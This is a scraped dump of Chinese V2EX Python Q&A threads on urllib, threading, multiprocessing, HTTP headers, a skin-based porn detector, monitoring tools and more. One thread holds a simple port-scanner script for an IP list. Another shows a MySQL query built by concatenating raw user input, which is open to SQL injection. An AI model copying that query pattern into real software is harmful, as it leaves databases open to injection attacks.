self.req.full_url = url\n    print(url)\n    with request.urlopen(self.req) as htm:\n        return htm.read()\n    \ndef searchBooks(self,page): # 书目 可能抛异常\n    global pat_books     \n    url = self.url.format(parse.quote(self.bkname),page)            \n    res = self._search(url).decode('utf-8','ignore')\n    self.books = pat_books.findall(res)\n    \ndef searchHome(self,homeUrl): # 搜索书籍主目录的章节列表\n    global pat_home           # 章节列表[(url,name),]        \n    res = self._search(homeUrl).decode('gbk','ignore')\n    self.books = pat_home.findall(res)  \n</code></pre>\n<p>def showMenu(books,page):</p>\n<pre><code>        print('\\n\\t 第 {} 页'.format(page+1))\n        for i,book in enumerate(books):\n            print('{}:  {}'.format(i,book[1]))\n</code></pre>\n<p>def main():   # 节选</p>\n<pre><code>s = Search_req()           \nwhile True: \n    s.bkname = input('\\n 网络小说搜索 [回车退出] ：').strip()  \n    if not s.bkname: break\n    for page in range(10):\n        try:\n            s.searchBooks(page)     # 获取书目\n            if not s.books: break                \n            showMenu(s.books,page)  # 显示书籍搜索结果\n            id = input('请根据序号选择(f:翻页  q:退出):').lower()\n            if id == 'q' : return\n            if id == 'f': continue\n            homeurl,s.bkname = s.books[int(id)] #获得所选书籍主页[url,name]\n            s.searchHome(homeurl)               # 获取主页上的章节列表 \n            print('test: END')\n            break\n        except Exception as err:\n            print(str(err))\n            break\n</code></pre>\n<p>if <strong>name</strong> == '<strong>main</strong>':  # 这里应为__main__</p>\n<pre><code>    url = r'http://www.mianhuatang.la/31/31605/'  # 提出来单独测试\n    req = request.Request(url,headers=headers)\n    with request.urlopen(req) as htm:\n        print('ok')\n\n    main()  # 主测试\n</code></pre>\n</div></div>"], "reply": "1", "tittle": "request.Request 实例重用疑问？", "comment": ["pat_books = re.compile(r'<a\\s+cpos=\"title\"\\s*href=\"(.+?)\"\\s*title=\"(.+?)\"')\r", "pat_home = re.compile(r'(?<=<dd><a href=\")(.+?)\">(.+?)</a>')"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如下 Python threading 标准库_Condition 类的的代码。在 Wait 条件发生前，需要先 acquire _Condition 的锁。</p>\n<p>而在 wait 的时候，会先判断 当前线程 是否拥有该锁。</p>\n<h2>疑问：它具体是如何判断该锁属于当前线程的？</h2>\n<h5>_is_owned 方法</h5>\n<pre><code>   def _is_owned(self):\n        if self.__lock.acquire(0):\n            self.__lock.release()\n            return False\n        else:\n            return True\n</code></pre>\n<h5>完整代码</h5>\n<pre><code>class _Condition(_Verbose):\n    def __init__(self, lock=None, verbose=None):\n        _Verbose.__init__(self, verbose)\n        if lock is None:\n            lock = RLock()\n        self.__lock = lock\n        self.acquire = lock.acquire\n        self.release = lock.release\n        try:\n            self._release_save = lock._release_save\n        except AttributeError:\n            pass\n        try:\n            self._acquire_restore = lock._acquire_restore\n        except AttributeError:\n            pass\n        try:\n            self._is_owned = lock._is_owned\n        except AttributeError:\n            pass\n        self.__waiters = []\n\n    def __enter__(self):\n        return self.__lock.__enter__()\n\n    def __exit__(self, *args):\n        return self.__lock.__exit__(*args)\n    def __repr__(self):\n        return \"&lt;Condition(%s, %d)&gt;\" % (self.__lock, len(self.__waiters))\n\n    def _release_save(self):\n        self.__lock.release()           # No state to save\n\n    def _acquire_restore(self, x):\n        self.__lock.acquire()           # Ignore saved state\n\n    def _is_owned(self):\n        if self.__lock.acquire(0):\n            self.__lock.release()\n            return False\n        else:\n            return True\n    def wait(self, timeout=None):\n        if not self._is_owned():\n            raise RuntimeError(\"cannot wait on un-acquired lock\")\n        waiter = _allocate_lock()\n        waiter.acquire()\n        self.__waiters.append(waiter)\n        saved_state = self._release_save()\n        try:    # restore state no matter what (e.g., KeyboardInterrupt)\n            if timeout is None:\n                waiter.acquire()\n                if __debug__:\n                    self._note(\"%s.wait(): got it\", self)\n            else:\n                endtime = _time() + timeout\n                delay = 0.0005 # 500 us -&gt; initial delay of 1 ms\n                while True:\n                    gotit = waiter.acquire(0)\n                    if gotit:\n                        break\n                    remaining = endtime - _time()\n                    if remaining &lt;= 0:\n                        break\n                    delay = min(delay * 2, remaining, .05)\n                    _sleep(delay)\n                if not gotit:\n                    if __debug__:\n                        self._note(\"%s.wait(%s): timed out\", self, timeout)\n                    try:\n                        self.__waiters.remove(waiter)\n                    except ValueError:\n                        pass\n                else:\n                    if __debug__:\n                        self._note(\"%s.wait(%s): got it\", self, timeout)\n        finally:\n            self._acquire_restore(saved_state)\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "Python _Condition 类的_is_owned 方法实现问题", "comment": ["# If the lock defines _release_save() and/or _acquire_restore(),\r", "# these override the default implementations (which just call\r", "# release() and acquire() on the lock).  Ditto for _is_owned().\r", "\r", "这是 Python 源代码中的注释，具体取决于 lock 本身的实现", "至于具体怎么实现，可以参考我用 Redis 实现的分布式 Lock\r"]},
{"content": "", "reply": "2", "tittle": "用 BeautifulSoup，如何过滤某些标签\r\n比如我想对 “ </p>, <p data-page-model=\"text\"> ”这个进行过滤", "comment": ["In [1]: from bs4 import BeautifulSoup\r", "\r", "In [2]: soup = BeautifulSoup('''<p data-page-model=\"text\">a</p>\\n <p data-page=\"text\">b</p>''', \"html.parser\")\r", "\r", "In [3]: soup.find_all(\"p\", attrs={'data-page-model':'text'})\r", "Out[3]: [<p data-page-model=\"text\">a</p>]\r", "\r", "In [4]: soup.find_all(\"p\", attrs={'data-page':'text'})\r", "Out[4]: [<p data-page=\"text\">b</p>]", "提前把 html document replace 一下？\r", "html.replace('</p>, <p data-page-model=\"text\">','')"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://opensource.googleblog.com/2017/01/grumpy-go-running-python.html\" rel=\"nofollow\">https://opensource.googleblog.com/2017/01/grumpy-go-running-python.html</a></div>"], "reply": "目前尚无回", "tittle": "Google 新轮子： Grumpy，将 Python 转译成 Go", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天遇到了一个很让人费解的问题。问题的起因是没有把多进程程序写在 __main__下面（ windows 系统下）\n然后就尴尬了。</p>\n<p>以前学习多进程是在 Linux 下，用的较多的是 fork ，今天遇到的问题，很有意思，所以就写下来。</p>\n<pre><code># -*- coding: utf-8 -*-\n__author__ = 'bigboydream'\n\nimport random\nfrom multiprocessing import Process\nimport os\n\nprint('I am ', os.getpid())\nrand_num = random.randint(0, 20)\n\ndef foo():\n    print('I am {}, rand_num is {}'.format(os.getpid(), rand_num))   # 子进程的 rand_num\n\nif __name__ == \"__main__\":\n    print('I am {}, rand_num is {}'.format(os.getpid(), rand_num))  # 父进程的 rand_num\n    p = Process(target=foo)\n    p.start()\n    p.join()\n\n'''\nI am  16880              \nI am 16880, rand_num is 10   \nI am  7592             # 执行了两次 print('I am ', os.getpid())...\nI am 7592, rand_num is 2   # 父进程和子进程的 rand_num 居然不一样...\n'''\n</code></pre>\n<p>用 fork 的思维想了一下\n第一：\nprint('I am ', os.getpid())，应该只能执行一次啊\n第二：\nrand_num 应该一样啊</p>\n<p>但是出现了不一样的结果，难道 p.start()的时候，</p>\n<pre><code>import random\nfrom multiprocessing import Process\nimport os\n\nprint('I am ', os.getpid())\nrand_num = random.randint(0, 20)\n'''\n又执行了一遍！！！\n'''\n</code></pre>\n<p>所以得到了以上的结果。</p>\n<p>难怪多进程程序不写在__main__下面会出现错误，不然就一直在递归地创建子进程了。</p>\n<p>一样的代码在 Linux 下运行</p>\n<pre><code># -*- coding: utf-8 -*-\n__author__ = 'bigboydream'\n\nimport random\nfrom multiprocessing import Process\nimport os\n\nprint('I am ', os.getpid())\nrand_num = random.randint(0, 20)\n\ndef foo():\n    print('I am {}, rand_num is {}'.format(os.getpid(), rand_num))   # 子进程的 rand_num\n\n\nprint('I am {}, rand_num is {}'.format(os.getpid(), rand_num))  # 父进程的 rand_num\np = Process(target=foo)\np.start()\np.join()\n\n'''\nI am  3811\nI am 3811, rand_num is 17\nI am 3841, rand_num is 17\n'''\n'''\n感觉好像靠谱了\n'''\n</code></pre>\n<p>用 fork 呢？</p>\n<pre><code># coding : utf-8\n\nimport os\nimport random\n\nprint('I am ', os.getpid())\nrand_num = random.randint(0, 20)\n\nret = os.fork()\n\nif ret==0:\n    print('child pid is {}, rand_num is {}'.format(os.getpid(), rand_num))\nelse:\n    print('parent pid is {}, rand_num is {}'.format(os.getpid(), rand_num))\n\n'''\nI am  4054\nparent pid is 4054, rand_num is 12\nchild pid is 4084, rand_num is 12\n'''\n'''\n真好\n'''\n</code></pre>\n<p>但是有一个问题就是 multiprocessing 在 Linux 系统上和 windows 系统下表现不一致， Linux 系统下 Python 用 fork 实现了多进程？</p>\n<p>请问学习多进程有什么好的资料吗？想多学一点这方面的知识，今天搞的有点懵圈</p>\n</div></div>"], "reply": "8", "tittle": "multiprocessing 与平台有关", "comment": ["这次修坑的过程就是最好的学习资料~\r", " 官方文档也写了 multiprocessing 在 Windows 平台的不一致性。", "Windows 下没有 fork ，表现不一样不是很正常的吗？而且 Windows 的进程模型跟 linux 也不一样", "posix 线程和 Windows 线程是不一样的底层实现机制嘛", "python2 和 3 的官方文档都写了， multiprocessing 在 wun 上的实现是开启一个新进程，而在 posix 环境下默认使用 fork 方式。当然这个启动方式是可以更改的，可以在初始化 Process 的时候指定启动方式（ win 下 fork 不可用而已）", " 恩，当初没仔细看文档，现在来好好看看。以前都是以为底层实现机制都被封装，一样的代码能够得到一样的结果，这才是跨平台嘛。。看来还是书读少了", " 。没有太了解进程模型，一直以为一样的 python 代码会在不同的平台得到一样的结果，所以这次增加了一点经验。", " 厉害呀，我并不了解底层实现机制", " 恩恩，才去看文档，确实写了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在 python 哪个请求库支持类似这样的 header ？</p>\n<p>大部分的 header 都是通过 dict 封装的，</p>\n<p>多个重复的 header 没法子传啊。</p>\n<pre><code>\nPOST /api/xxx/xxxx HTTP/1.1\nCust-Header: cookie_line_1\nCust-Header: cookie_line_2\nCust-Header: cookie_line_3\nCust-Header: cookie_line_4\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G9200 Build/MMB29K)\nHost: xxx.xxx.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 926\n\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "刚接触 python，有些关于 http 请求的东西搞不定.", "comment": ["推荐 requests\r", "\r", "import request\r", "headers = {\r", "    \"Cust-Header\": \"cookie_line_1\",\r", "    \"Cust-Header\": \"cookie_line_2\",\r", "    \"Cust-Header\": \"cookie_line_3\",\r", "    \"Cust-Header\": \"cookie_line_4\",\r", "    \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\r", "    \"User-Agent\": \"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G9200 Build/MMB29K)\",\r", "    \"Host\": \"xxx.xxx.com\",\r", "    \"Connection\": \"Keep-Alive\",\r", "    \"Accept-Encoding\": \"gzip\",\r", "    \"Content-Length\": \"926\"\r", "}\r", "\r", "url = \"\"\r", "\r", "requests.post(url, headers=headers)", " 传入的还是 dict ，会被覆盖掉的", "或许可以试一下\r", " 哦，你是这个意思，不过\r", "Cust-Header: cookie_line_1\r", "Cust-Header: cookie_line_2\r", "Cust-Header: cookie_line_3\r", "Cust-Header: cookie_line_4\r", "不等效于\r", "Cust-Header: cookie_line_1 ， cookie_line_2,cookie_line_3,cookie_line_4 么？", " 服务器不知道做了什么脑残的东西，没有按 http 协议走，分开传。", " 感谢，没想到 header 的 value 还能带换行。哈哈哈哈。受教了"]},
{"content": ["<div class=\"topic_content\">类似的代码，除了 header 不一样， POST request 就没有问题\r<br>GET request 的 header 和实际请求是一致的，而且把整个 url 直接在浏览器访问也是没有问题的\r<br>麻烦不要说请用 requests 之类的，我就是想知道 httplib 怎么使用，毕竟这样比一长串 url 可视一些。。\r<br>\r<br>\r<br>import httplib, json, urllib\r<br>\r<br>params = urllib.urlencode({\r<br>    \"offset\": \"0\",\r<br>    \"limit\": \"10\",\r<br>    \"longitude\": \"121.607022\",\r<br>    \"latitude\": \"31.219697\"\r<br>})\r<br>\r<br>headers = {\"Accept-Encoding\": \"gzip, deflate\",\r<br>           \"Accept-Language\": \"zh-Hans-CN;q=1\"}\r<br>conn = httplib.HTTPConnection(\"api.sit.com\")\r<br>conn.request(\"GET\", \"/activity\", json.JSONEncoder().encode(params))\r<br>response = conn.getresponse()</div>", "<div class=\"topic_content\">如果 Method 是 POST 数据就要放在 BODY 中。也没有要求，如果 Method 是 GET ，数据（参数）就一定要放在 URL 中而不能放在 BODY 中\r<br>\r<br>大概就是这样了。。。</div>"], "reply": "4", "tittle": "httplib 的 get request 如何正确使用 params？", "comment": ["唉  楼主语文是哪个老师教的\r", "不行就 wireshark 抓包看看有啥不一样吧", " 很清楚啊\r", "\r", "对于 post 请求，按照这种方法能正确请求\r", "conn.request(\"POST\", \"/activity1\", json.JSONEncoder().encode(params) , headers)\r", "对于 get 请求，这个没有特殊要求其实是可以不加 header 的，但是不管加不加都不能正确传入 params\r", "conn.request(\"GET\", \"/activity2\", json.JSONEncoder().encode(params) , headers)\r", "\r", "所以我想知道 get 请求是不是不能用 conn.request(\"GET\", url, params , headers)这样的方式\r", "我改成 conn.request(\"GET\", \"/activity2?\" + json.JSONEncoder().encode(params))是可以的", " 不能", "为什么是 JSON encode 啊\r", "难道不该是 urlencode 么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我想写个小脚本，内容是把一年中是周末且周末是在新月那几天（农历 27-3 日），但是现在找不到公历转农历的包，之前的工作如下：</p>\n<p>#生成一个一年的日历</p>\n<p>df = pd.DataFrame(pd.date_range(start='2017-01-01',end='2017-12-31'),columns=['公历'])</p>\n<p>df = df.set_index(keys='公历')</p>\n<p>#找出所有周末</p>\n<p>df['星期几'] = df.index.weekday + 1</p>\n<p>Sat = df['星期几'] == 6</p>\n<p>Sun = df['星期几'] == 7</p>\n<p>#找出国庆节，别的节太短或者和周末都挨着</p>\n<p>National_Day = df['2017-10-01':'2017-10-07']</p>\n<p>new_df = pd.concat([df[Sat | Sun],National_Day])</p>\n<p>df2 = df.ix[new_df.sort_index().index.drop_duplicates()]</p>\n<p>下一步就该找出这个日历的农历了，有没有人教教我怎么做？</p>\n<p>pypi 上有个 lunarsolarcovter 是 py2 用的，我用不了</p>\n</div></div>"], "reply": "4", "tittle": "有没有 python3 可用的农历转公历的包？", "comment": ["LunarSolarConverter 就 200 行代码，你自己改一下不就完了", "标题是农转公，正文是公转农，要哪个？\r", "\r", "\r", "!/usr/bin/env python3\r", "# -*- coding: utf-8 -*-\r", "\r", "# lunar.py\r", "# 2015/02/27 罗兵\r", "\r", "google 这个能找到", " 公转农， github 搜到了，谢谢", " 之前只想着从 pypi 下载，没仔细看他内容，我以为会有别的时间包也能实现呢"]},
{"content": ["<div class=\"topic_content\">import multiprocessing\r<br>\r<br>def socket_port(ip, PORT):\r<br>    global portdetaildict\r<br>    s = socket.socket()\r<br>    s.settimeout(0.1)\r<br>    if s.connect_ex((ip, PORT)) == 0:\r<br>        print ip, PORT, 'is open'\r<br>        portdetaildict[str(ip)] += str(PORT)+';'\r<br>    s.close()\r<br>\r<br>\r<br>def scan(ip):\r<br>    s = socket.socket()\r<br>    s.settimeout(0.1)\r<br>    common_port_list = [80, 443, 8080]#这里可以扩展成 200 个常用端口\r<br>    for port in common_port_list:\r<br>        thread.start_new_thread(socket_port, (ip, int(port)))\r<br>\r<br>def worker(q):\r<br>    while not q.empty():\r<br>        ip = q.get()\r<br>        try:\r<br>            scan(ip)\r<br>        finally:\r<br>            q.task_done()\r<br>\r<br>if __name__ == '__main__':\r<br>  q = multiprocessing.JoinableQueue()\r<br>  iplines = linecache.getlines('../test.iplist')\r<br>  timestart = time.time()\r<br>  for oneip in iplines:\r<br>      print oneip\r<br>      thisip = str(oneip).strip()\r<br>      map(q.put, thisip)\r<br>  \r<br>  jobs = [multiprocessing.Process(target=worker, args=(q,)) for i in xrange(100)]\r<br>  map(lambda x:x.start(),jobs)\r<br>  \r<br>   #想写个能快速扫完指定 iplist 里所有 ip 的指定若干端口是否开放的多线程 py ，我知道倒数第二行有问题不太知道如何把 ip 传进去。。 help 。。。我真是小白。。</div>"], "reply": "12", "tittle": "多线程多 IP-portscaner 一脸萌比", "comment": ["第一，这是多进程\r", "第二，这种情况异步 io 直接单进程完成，效率不知道高哪里去了", "你这是多进程啊，应该用 dummy 的。\r", "```\r", "for p in jobs;\r", "        p.start()\r", "   \r", "    q.join()\r", "    for p in jobs:\r", "        p.join()\r", "```\r", "\r", "类似这样的", " 大神紧急求助！小弟对 python 不太熟求救，实在不太懂如何写，能再说的详细一点吗？十分感谢！", " 打错了。。十分抱歉。大神异步 io 单进程怎么搞啊，小弟刚大一，对编程还不太熟。。。能再说的详细一点吗，小弟肯定认真钻研！", "其实我想说这种情况用 threadpoolexecutor + future 简直再合适不过了，写过一篇半成品 blog ", " 不知道有没有帮助。 @", " 说的是 asyncio ？其实没怎么用过(噗。。)", " 额我只想用一个 JoinableQueue 来解决问题，我这个代码现在唯一的问题就是\r", "jobs = [multiprocessing.Process(target=worker, args=(q,)) for i in xrange(100)] \r", "这句里 q 的赋值我没太搞懂，我想把 iplist 赋值进去好让它一个一个处理，对 python 语法不熟。。。求点拨！", " C 程序员比较喜欢 epoll", "这显然是 IO bound 的情况， 1G 带宽打满也用不了一个核。。。\r", "epoll kqueue 是正解，开几千个线程也马马虎虎吧，起那么多进程就有点浪费了。", " \r", "问代码至少要贴一下错误输出吧。", "V2Ex 不支持代码缩进的么？？？？？？以后直接贴代码图吧？还是 V2EX 不支持 Markdown 之类？", " \r", "v2ex 贴代码技巧里有写： ", " 多谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://www.songluyi.com/wp-content/uploads/2017/01/PornDetectiveLogo.png\"></p>\n<h2>前言</h2>\n<p>这两天跨年，就想将自己的 Python 组织和表达能力再提高一下，当然最好的方式自然是读大师的源码，我也就看到实验楼上面的那篇关于色情图片识别的文章，因此依葫芦画瓢才建了这个库。</p>\n<h2>0x01 色情识别算法介绍</h2>\n<p>检测色情或者说判定是否是色情的关键是通过皮肤的裸露程度判别，也就是说色情识别算法的核心就是识别皮肤。</p>\n<p>那么现今主要识别皮肤的是通过三个步骤：首先选择合适的颜色空间来表征图像像素；然后使用适当的皮肤模型来建模皮肤和非皮肤部分像素；最后依据此建模来分割出正确的皮肤部分。而识别皮肤的关键在于寻找到合适的像素区间，因为肤色 种族 光照 等等因素都会影响到皮肤的识别。</p>\n<p>从 2015 年的厦大陈丽一篇《一种融合方法的皮肤检测技术》上我们了解到 在图片预处理 降噪 resize 后 将二维直方图 高斯模型 动态阈值 三个处理模型进行混合的综合皮肤检测技术，能达到识别率 90+的程度，比其他三种模型高出一到五个百分点。</p>\n<p><code>那么实验楼这位作者是如何去识别一张图片的皮肤部分呢？</code></p>\n<ul>\n<li>皮肤确认的像素公式采用 stack 上的采用的是网上的 YCbcr 的公式 当然他也写了其他的公式，效果不如这个好</li>\n<li>确认为皮肤像素后进行归类。新发现的皮肤像素定位新的一块，如果皮肤像素周边有其他的像素就 merge 当然 我在测试的过程中，这个 merge 算法仍然可以优化，如果有小伙伴的话~</li>\n<li>归类后，判定是否为色情图片的 rules 他写了四条 当然这个判别不能和机器训练相比 但是已经比较准确了</li>\n</ul>\n<h2>0x02 我在此基础上做了什么？</h2>\n<ul>\n<li>完善 showskinorigin 方法，使其能够将被判定为皮肤的像素进行涂白 方便进行对比</li>\n<li>修改某些不是很 python 的方法，剔除单通道图片。</li>\n<li>新加入 LoadWay 文件，可以方便的扫描目录 图片 url 列表并检查是否为色情图片</li>\n<li>增加容错模块，单元测试后，打包然后共享给大家~</li>\n</ul>\n<h2>0x03 未来将会准备做什么？</h2>\n<ul>\n<li>根据论文的算法 在 python 上进行部分实现，方便优化算法</li>\n<li>修复多线程效率过低 占用内存过多的问题</li>\n<li>希望能够建立 server 返回 API</li>\n</ul>\n<p>试验效果图属不可描述范围~附上 Gayhub 地址~</p>\n<pre><code>当然我不会说那个 HeiHeiHei 函数是干嘛的==\n</code></pre>\n<p><a href=\"https://github.com/songluyi/PornDetective\" rel=\"nofollow\">github 地址</a>\n![]( <a href=\"http://www.songluyi.com/wp-content/uploads/2017/01/QQ\" rel=\"nofollow\">http://www.songluyi.com/wp-content/uploads/2017/01/QQ</a> 截图 20170103220111.png)</p>\n</div></div>"], "reply": "35", "tittle": "鉴黄师专用 Python 轮子之 PornDetective", "comment": ["只是识别皮肤裸露有问题吧？ 那肚皮舞也变 porn 了。\r", "\r", "很明显需要更高端的算法。之前我看到有程序，能做到识别并且”标识敏感区域“（就是标识乳头和 XX ）", "总觉得人工硬编写识别逻辑的做法会被深度学习完全替代掉。。。", "非洲同胞的皮肤能识别不-。-", "同意一楼看法", "你让微博上那些网红情何以堪？", "反向使用，黄的留下？", "还以为是自动上车", " 同意。", " \r", " 向老司机致敬", "当然这个轮子出于学习目的还是很棒的！学习了:D", " 不是大型云商的话，哪来那么多训练集？？\r", "\r", "又不是某某云。", "Yahoo 似乎以前放出来过一个 porn-detect 的 network 和 model...", "对鉴黄程序没兴趣，我只对他们的内容数据库敢兴趣", " PornDetective - find porn img easilly", "弟弟 妹妹 咪咪的目标识别比较靠谱，", "很常见的一个案例，一个穿泳装类的，站姿和蹲姿（你懂的那个姿势）的皮肤裸露程度有太大不同？但这两者是色情程度一个天上一个地下", " 我简单解释一下。\r", "1. 色情图片是分级别的 有皮肤暴露 卡通色情 成人色情 的区分 退一万步来说大数据分析得到所有三点特征匹配的也是成人色情。\r", "2. 皮肤算法不是说识别大块皮肤 或者加个权重就行，具体的识别多少区块 占比多少 像素值多少才能算 这个规则是通过样本采集来的。\r", "3. 判定的 rules 在程序中的确预先写好，后续将会加入训练模型， rules 是可以优化的。", "建立 Server 用来返回 API 调用…于是 Server 上就会有看不完的 porn 照了…嘿嘿嘿", "  额 穿泳装蹲下你从哪里看啊喂→_→上面喵", " 然后有人利用这个玩意弄了个能够生成黄图的玩意😂", "我感觉通过分析音频来鉴黄比较简单...", " 色情图片，用音频识别，在下佩服佩服", " 就关注鉴黄没在意是图片了，尴尬（逃", "基本上都是深度学习了，检测皮肤不靠谱的", "试了腾讯万象，这东西还是得用深度学习，现有算法准确率没那么高", " 233333333", "一点看法:\r", "\r", "1. 基于像素+人工规则 的方法鲁棒性存在问题，像其他同学说的那样，深度学习更靠谱。\r", "2. 为什么不用 scikit-image 或 opencv 等基于 numpy 的库呢？ 这样性能不是更好吗？\r", "3. 楼主的代码和 nude.py 的代码有些类似，但没看到说有参考 nude.py ，或者楼主是参考的实验楼该项目作者的代码？\r", "\r", "    ", "\r", "    ", " 的确借鉴他的，我也在文中说明了我改了那些 新加了那些东西。 看起来诸位都看好深度学习的| ू•ૅω•́)ᵎᵎᵎ我还是默默去看文献了⊙▽⊙", "求原始训练集高清五码图片。", "yahoo 的鉴黄开源项目在这里  ", "\r", "另外，还有人根据 yahoo 的模型反向制作了图片生成器，在这里： ", " 其中有大量算法生成的图片，怎么说呢，还是值得一看的\r", "\r", "anyway ，请大家搭配服用", "其实微博上很多网红露太多了，都不穿衣服，但都利用手势或者其他姿势恰好遮住了三点，虽然也是几乎没遮住。。。这种情况啊，连微博管理员都不知道到底该删不该删。", "mark", " 正如前人所说：你叫那些直播网红怎么办啊？", "胶衣丝袜控有福了→_→", "大项目，有兴趣合作吗？可加 QQ 1005367713 私聊。"]},
{"content": ["<div class=\"topic_content\">如果开发人员资源也很紧张呢？</div>"], "reply": "40", "tittle": "请求一下各位是怎么做报警监控的。特别是小组没有运维的情况下？", "comment": ["用 prometheus+granfa ，最近在做，很方便， grafana 4.0 新增了报警功能，可以对一个 panel 设置 alert ，状态改变就会发送通知", "如果追踪代码错误的话可以用 sentry", "没有人运维的情况下，直接写数据库，定时轮刷表最实在，通知可以注册一个企业号接微信的推送接口很方便。\r", "\r", "报警监控做一套架构出来可以玩出花来，但是一旦要改造或者硬件条件不够就要死了。", " 还在用 3.0 ， prometheus 自身也有报警功能的。", "没有运维用现成的服务最好。", "InfluxDB + Grafana ，效果还不错", "在用 prometheus", "riemann + influxdb + grafana", " 我知道本身那个，但是感觉配置 grafana 报警比较方便", " suXiong", " 什么现有服务？是指 360 云报警这种吗", "详细说明需求啊？你要监控网站运行？ mysql 还是啥？", " 40s 安装探针就可以用了，支持几十种基础组件监控", " 赞一下", "datadog + slack..", "用 ceilometer 啊", "  可以解决你们继续的 基础运维，互联网跳板机，机器权限管理，应用集群监控，基础软件环境一键部署，支持异地多网络（机房）管理，信息通知，实时报警 联通 微信，企业工单  \r", "一个管理员账号 ", "  密码 123456", "datadog + pagerduty", "nagios 邮件报警,可以自己写监控脚本", "那就招人呗。。。。", "我用的 zabbix", " prometheus+granfa  为什么要用两个？", "持续关注   最近就是这个烦恼", "自己写一套，可随时添加自己想要的功能", " peometheus 负责收集， grafana 展示", " zabbix + 1", "如果开发人员资源也很紧张呢？\r", "没人的话，只能用钱来填了。买各种软件，运维服务啥的。就是买买买。。。", "目前，我们给客户的项目做的服务器的管理主要是 阿里云全家桶，包括服务器的监控与报警：内存， cpu ，出入带宽；站点的监控， 200 以上报警。 通过设置参数，服务器或站点达到一定阈值后会邮件短信通知。 当然，网站的统计是 ga 。\r", "\r", "我们给客户做的是微信公众号的业务，由于采用 meteor ，对内存消耗比较大，所以会额外注意内存的指标，当然，出入带宽也是比较在意的。\r", "\r", "阿里云全家桶，免费。", "如果你要是给服务器监控报警的话，建议你遍个小程序，设置最高优先级，备份日志里面的程序，如果和日志的不同，那么就删除他，如果是防火墙的话你自己感觉就好，编辑程序里面可以编辑你的邮箱，达到你的需要。\r", "本人小白，不喜勿喷，不是引站", "有可能不是你的需要，答非所问，抱歉", "icinga2", "能花钱解决的就不要花人了，听云， oneapm 好像都有监控，不行就上阿里云", " 装了一下，的确很好，也对手机做了适配。", " 对手机适配是什么意思？", " 就是网页做了移动端的适配", "目前是使用 Zabbix+Grafana,效果倒是确实不错的，楼主可以百度一下看看 DEMO", " 请问哪里有部署 prometheus 清楚点的文档不，除了官网，网上大多只是最简单的安装", " 官网那个教程有哪里看不懂吗？我是看官网的", " 哈哈哈，官网看的吃力了点，所以看有没有好点的中文文档，那我还是老老实实跟着官网来，多谢解答", " 不客气，它的概念其实很简单，就是一个配置文件，在里面可以配置目标，它会定时去目标上访问 /metrics 收集数据，这样就算完成了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>程序代码如下：</p>\n<pre><code>print(\"To determine whether the prime number\")\nprimenumbertext=input(\"Enter a number:\")\nprimenumber=float(primenumbertext)\ntestnumber=2\n\n\nwhile True:\n\tif testnumber==primenumber:\n\t\tprint(primenumbertext+\" is prime number!\")\n\t\tinput()\n\t\tbreak\n\telif primenumber%testnumber==0:\n\t\ttestnumbertext=str(testnumber)\n\t\tprint(primenumbertext+\" can be divisible by \"+testnumbertext+\" !\")\n\t\tinput()\n\t\tbreak\n\ttestnumber=testnumber+1\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "用 python 写的判断质数的程序，输入一个较大的奇数时它告诉我可以被 2 整除，为什么？", "comment": ["Python3 的求模运算里面用的是浮点数除法，超大奇数在浮点数除法时可能会丢失精度，导致结果错误。所以你把程序里面的超大整数套一层 Decimal 封装就好了。\r", "md 你自己将输入值转成 float 了", "primenumber=float(primenumbertext)\r", "\r", "闲得蛋疼？", "质数还能是 float ？？？", "BTW ，质数判定算法建议用概率算法。（前段时间研究 1 个月的感受。）", " \r", " 和 int 效果相同呀"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题。</p>\n</div></div>"], "reply": "3", "tittle": "使用 aiohttp 写大型项目的目录结构一般是怎样的？", "comment": ["我倒是没用过 aiohttp 写 web ，找了一下找到了以下几个例子，希望能帮到你~\r", "[aiohttp_polls]( ", ")\r", "[pydatacoll]( ", ")\r", "[clang]( ", ")\r", "\r", "顺带一提，如果你要用到 redis 的话我想安利一发我写的 redis client ， api 和 redis-py 相同，但是底部已经重写为异步的了。\r", "[aredis]( ", ")", " 谢了，发现 aiohttp 也是完全可以组成类似于 flask 的 blueprint 的形式。", " 恩恩"]},
{"content": ["<div class=\"topic_content\">#-*-coding:utf-8-*-\r<br>import MySQLdb\r<br>import sys\r<br>import os\r<br>\r<br>reload(sys)\r<br>sys.setdefaultencoding('utf8')\r<br>\r<br>conn= MySQLdb.connect(\r<br>        <a target=\"_blank\" href=\"http://host='.gz.cdb.myqcloud.com\" rel=\"nofollow\">host='.gz.cdb.myqcloud.com</a>',\r<br>        port = ,\r<br>        user='',\r<br>        passwd='',\r<br>        db ='robot',\r<br>        charset=\"utf8\"\r<br>        )\r<br>cur = conn.cursor()\r<br>\r<br>entering = raw_input(\"please enter : \")\r<br>\r<br>entering=\"'\" + entering + \"'\"\r<br>\r<br>sql = \" SELECT REPLY FROM robot.reply where RECEIVE = \"\r<br>\r<br>cur.execute(sql+entering)\r<br>results = cur.fetchone()\r<br>\r<br>print results\r<br>\r<br>conn.close()\r<br>\r<br>\r<br>写了一段 py  ， 按照数据库有的内容输出，可是中文输出的是 unicode 请问怎么转码\r<br>\r<br>\r<br>&lt;a href=\"http://imgur.com/jxAdVsS\"&gt;&lt;img src=\"<a target=\"_blank\" href=\"http://i.imgur.com/jxAdVsS.jpg\"><img src=\"http://i.imgur.com/jxAdVsS.jpg\" class=\"embedded_image\"></a>\" title=\"source: imgur.com\" /&gt;&lt;/a&gt;</div>"], "reply": "13", "tittle": "想请教怎么转 码", "comment": ["cur.execute(sql+entering) \r", 